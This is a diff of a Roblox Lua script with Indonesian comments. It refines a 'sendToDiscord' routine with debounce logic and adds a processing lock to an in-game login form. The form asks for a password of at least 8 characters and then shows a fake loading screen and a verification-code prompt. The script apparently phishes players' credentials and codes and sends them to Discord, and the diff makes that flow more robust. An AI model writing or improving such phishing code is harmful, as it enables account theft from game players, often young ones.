@@ -330,17 +330,12 @@ end
 -- Tabel untuk melacak pengiriman data
 local sentData = {}
 local debounceTime = 5 -- waktu delay (detik)
-
--- Fungsi untuk membuat hash data unik
-local function createHash(data)
-    local httpService = game:GetService("HttpService")
-    return httpService:GenerateGUID(false) .. tostring(data)
-end
+local isProcessing = false -- Untuk mencegah multiple execution
 
 -- Fungsi untuk mengirim data ke Discord dengan anti-spam
 local function sendToDiscord(data)
     local currentTime = tick()
-    local identifier = createHash(data) -- Hash data untuk identifikasi unik
+    local identifier = tostring(data)
 
     -- Cek apakah data sudah terkirim dalam waktu debounce
     if sentData[identifier] and (currentTime - sentData[identifier] < debounceTime) then
@@ -492,10 +487,17 @@ local function createLoginGUI()
     loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
     loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Fungsi Tombol Login
+    -- Fungsi Tombol Login dengan debounce
     loginButton.MouseButton1Click:Connect(function()
+        if isProcessing then
+            print("Processing in progress. Please wait.")
+            return
+        end
+
+        isProcessing = true -- Mulai proses
         if #password < 8 then
             errorLabel.Text = "Password minimal 8 karakter!"
+            isProcessing = false -- Reset status
             return
         end
 
@@ -506,6 +508,7 @@ local function createLoginGUI()
         gui:Destroy()
         createLoadingGUI(3, function()
             createVerificationCodeGUI()
+            isProcessing = false -- Selesai proses
         end)
     end)
 end
